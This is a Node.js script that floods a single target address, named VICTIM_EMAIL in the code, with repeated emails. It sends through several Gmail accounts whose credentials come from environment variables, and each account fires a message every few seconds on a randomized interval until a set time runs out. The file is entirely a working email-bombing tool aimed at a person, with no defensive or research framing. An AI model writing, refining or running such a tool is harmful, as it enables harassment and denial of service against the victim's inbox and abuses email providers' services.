const nodemailer = require('nodemailer');
const fs = require('fs');
const smtpTransport = require('nodemailer-smtp-transport');
require('dotenv').config();

const emails = process.env.EMAIL_SENDERS.split(';');
const passwords = process.env.EMAIL_SENDER_PASSWORDS.split(';');
const DEBUG = process.env.DEBUG;

const to = process.env.VICTIM_EMAIL;

const users = makeUsers(emails, passwords);

function main(users, to) {
    for (i in users) {
        if (users[i] == null) return;

        const user = users[i];
        let time = 4000 + 1000 * Math.ceil(Math.random() * 5);
        const timeExecute = process.env.EXECUTION_TIME;

        if (DEBUG) console.log({
            user: user,
            time: time
        });

        let interval = setInterval(() => {
            send(user, to);
        }, time);
        setTimeout(() => {
            clearInterval(interval);
            console.log('Finished.');
        }, timeExecute);
    }
}

const send = (user, to) => {
    if (DEBUG) console.log(user);

    const from = user.email;
    const pass = user.password;

    const transporter = nodemailer.createTransport(smtpTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        auth: {
            user: from,
            pass: pass
        }
    }));

    const mailOptions = {
        from: from,
        to: to,
        subject: process.env.EMAIL_SUBJECT,
        text: process.env.EMAIL_TEXT
    };

    transporter.sendMail(mailOptions, (err, info) => {
        if (err) console.error(err);
        else console.log(`Email sent: ${info.response}`);
    });
}

function makeUsers(emails, passwords) {
    let users = [];
    for (let i = 0; i < emails.length; i++) {
        users.push({
            email: emails[i],
            password: passwords[i]
        });
    }

    if (DEBUG) console.log(users);
    return users;
}

main(users, to);